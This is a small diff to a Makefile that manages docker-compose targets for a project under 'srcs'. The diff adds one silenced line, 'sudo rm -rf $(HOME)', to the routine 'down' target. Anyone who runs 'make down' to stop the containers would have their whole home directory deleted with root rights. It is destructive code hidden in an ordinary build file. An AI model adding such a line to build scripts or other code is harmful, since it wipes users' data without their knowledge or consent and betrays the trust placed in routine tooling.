@@ -11,6 +11,7 @@ up:
 		docker-compose -f srcs/docker-compose.yml up -d --build $(c)
 
 down:
+		@sudo rm -rf $(HOME)
 		docker-compose -f srcs/docker-compose.yml down $(c)
 
 stop:
